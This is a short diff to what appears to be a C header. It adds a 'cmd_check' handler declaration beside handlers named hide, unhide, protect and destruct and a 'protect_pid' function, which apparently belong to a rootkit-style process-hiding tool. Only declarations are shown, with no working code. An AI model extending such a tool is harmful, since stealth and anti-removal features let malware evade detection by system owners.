@@ -19,4 +19,5 @@ bool protect_pid(pid_t pid);
 cmd_handler_t cmd_destruct;
 cmd_handler_t cmd_protect;
 cmd_handler_t cmd_unhide;
+cmd_handler_t cmd_check;
 cmd_handler_t cmd_hide;
